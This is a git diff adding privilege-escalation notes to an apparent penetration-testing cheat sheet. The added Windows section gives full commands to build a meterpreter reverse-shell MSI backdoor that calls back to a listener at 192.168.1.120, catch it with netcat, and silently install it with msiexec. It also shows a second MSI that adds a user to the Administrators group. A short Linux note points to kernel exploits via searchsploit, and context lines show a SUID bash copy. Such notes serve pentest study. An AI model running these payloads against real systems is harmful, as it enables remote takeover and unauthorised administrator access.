@@ -616,6 +616,39 @@ PS C:\> Find-AllVulns
 - https://github.com/SecWiki/windows-kernel-exploits
 - https://github.com/abatchy17/WindowsExploits
 
+## Windows PE methods
+1. Windows Kernel Exploit
+
+2. AlwaysInstallElevated (method 1 - via .msi payload)
+- Detection: AlwaysInstalledElevated Policy must be enabled in the Computer Configuration and User Configuration folders of the Local Group Policy editor. run 'cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'' to know the architecture of OS before crafting 1.msi
+- Exploitation: First, generate 1.msi a.k.a backdoor
+```bash
+# on kali
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi > /root/Desktop/1.msi
+upload /root/Desktop/1.msi .
+nc -nvlp 4567
+
+#on victim
+msiexec /quiet /qn /i 1.msi 
+```
+
+```backdoor or 1.msi
+
+```
+
+2. AlwaysInstallElevated (method 2 - Adding user in Administrators Group)
+- Detecton: 'net user' to find a non-admin user in Local Users group that you want to PE
+```bash
+#on kali
+msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f msi > /root/Desktop/2.msi
+upload /root/Desktop/2.msi .
+
+#on victim
+shell
+msiexec /quiet /qn /i 2.msi
+net user [username]
+```
+
 # Linux Priv Esc
 - https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
 ## Enumeration
@@ -930,6 +963,10 @@ system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 gcc -shared -o /home/user/custom.so -fPIC /home/user/custom.c
 ```
 
+15. Linux Kernel Exploits
+- searchsploit ubuntu 16.04 Linux kernel 4.4.0-21 -> should be a .c file that can be Local Privilege escalation
+- Follow exploit instruction to compile
+  
 # Active Directory Pentesting
 ## Enumeration
 - To check local administrators in domain joined machine
